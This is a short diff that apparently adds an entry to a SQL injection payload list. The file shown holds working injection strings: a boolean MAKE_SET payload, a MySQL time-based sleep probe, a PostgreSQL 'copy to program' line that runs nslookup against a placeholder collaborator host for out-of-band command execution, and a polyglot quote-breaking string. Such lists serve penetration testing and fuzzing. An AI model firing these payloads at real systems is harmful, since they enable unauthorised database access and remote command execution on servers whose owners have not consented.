@@ -1,3 +1,4 @@
+0-3661)%20OR%20MAKE_SET(8165=8165,7677)%20AND%20(4334=4334
 XOR(if(now()=sysdate(),sleep(5),0))XOR
 copy (SELECT '') to program 'nslookup COLLABORATOR-HERE'
 &1/*'/*"/**/||1#\
